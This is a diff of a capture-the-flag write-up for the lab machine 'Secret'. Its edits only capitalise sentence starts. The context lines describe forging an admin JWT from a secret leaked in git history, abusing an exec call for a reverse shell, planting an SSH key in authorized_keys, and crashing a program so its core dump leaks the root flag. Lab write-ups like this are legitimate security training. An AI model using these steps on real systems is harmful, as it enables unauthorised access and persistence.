@@ -10,7 +10,7 @@ PORT     STATE SERVICE REASON
 3000/tcp open  ppp     syn-ack ttl 63
 ```
 
-we can fuzz the page but there is really nothing interesting.
+We can fuzz the page but there is really nothing interesting.
 First thing to do is download the source code on the main page and then follow the tutorial to create an account with burp for example.
 
 ```
@@ -38,7 +38,7 @@ Content-Length: 85
   }
 ```
 
-and we get our JWT token althought it is pretty useless since when we connect to /api/priv we just get a message saying that we are normal users.
+And we get our JWT token althought it is pretty useless since when we connect to /api/priv we just get a message saying that we are normal users.
 If we take a look at the source code in /routes/private.js we see that to be admin the our name must be 'theadmin'. So we need to fake our JWT token but we need the secret. If we take a look at the git commits
 
 ```bash
@@ -68,7 +68,7 @@ if (name == 'theadmin'){
             }
 ```
 
-we can exploit the exec function and create a reverse shell like this (nc -e doesn't work on this machine)
+We can exploit the exec function and create a reverse shell like this (nc -e doesn't work on this machine)
 
 ```bash
 ┌──(kali@kali)-[~/Machines/Secret]
@@ -99,14 +99,14 @@ dasith@secret:~/local-web$ cat /home/dasith/user.txt
 
 ### Root flag
 
-(we can add our own ssh key to make the work flow easier)
+(We can add our own ssh key to make the work flow easier)
 
 ```bash
 dasith@secret:~/local-web$ cd /home/dasith/.ssh
 dasith@secret:~/local-web$ echo 'yourkey' >> authorized_keys
 ```
 
-now if we search in /opt we find a program called count that gives us some information about **any** file or directory. If we look at the code in code.c we can see that if the program crashes it will send a report to /var/crash (default route) so lets do a little trick
+Now if we search in /opt we find a program called count that gives us some information about **any** file or directory. If we look at the code in code.c we can see that if the program crashes it will send a report to /var/crash (default route) so lets do a little trick
 
 ```bash
 dasith@secret:/opt$ ./count
@@ -128,9 +128,9 @@ dasith@secret:/opt$ fg
 Segmentation fault (core dumped)
 ```
 
-so we have now created a crash report, we can make it "readble" (it is a binary) by using
+So we have now created a crash report, we can make it "readble" (it is a binary) by using
 
 ```bash
 dasith@secret:/opt$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report
 ```
-and lasty search for the flag in the CoreDump Binary file in /tmp/crash-report
+And lasty search for the flag in the CoreDump Binary file in /tmp/crash-report
